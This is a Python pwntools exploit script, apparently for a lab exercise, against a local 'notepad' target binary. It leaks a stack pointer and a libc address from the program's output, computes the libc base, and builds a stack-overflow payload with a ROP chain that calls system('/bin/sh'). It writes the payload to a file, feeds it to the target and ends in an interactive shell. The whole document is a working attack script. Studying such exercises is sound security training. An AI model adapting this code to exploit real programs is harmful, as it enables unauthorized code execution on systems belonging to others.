from pwn import *

context.log_level = 1
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug(['./target'])
p = process('/home/lab10/notepad/target') 
elf = ELF('/home/lab10/notepad/target')
LIBC = elf.libc

p.recvuntil(b'> ')
p.sendline(b'2\nasdf')
p.recvuntil(b'Enter filename: ')
p.recv(0x128)

offset_libc_start_call_main = 0x214a0

address_fp = u64(p.recv(8))
p.recv(8)
address_libc_start_call_main_128 = u64(p.recv(8))

addr_libc_base = address_libc_start_call_main_128 - 0x29d90

print(hex(address_fp))
print(hex(addr_libc_base))

LIBC.address = addr_libc_base

binsh = next(LIBC.search(b'/bin/sh\x00'))

rop = ROP(LIBC)
rop.system(binsh)
print(rop.dump())

payload = b"A" * 0x100
payload += b"B" * 0x8
payload += b"C" * 0x8
payload += p64(0xffffffffffffffff)
payload += b"D" * 8 
payload += b"E" * 8 
payload += p64(address_fp)
payload += b"F" * 8
payload += p64(0x0000000000401724)
payload += rop.chain()

file_mal = open('payload', 'wb')
file_mal.write(b'1000\n')
file_mal.write(payload)
file_mal.close()

p.recvuntil(b"> ")
p.sendline(b'2')
p.recvuntil(b'Enter filename: ')
p.sendline(b"payload")
p.interactive()



# ropper -f ./target --search "pop %; ret"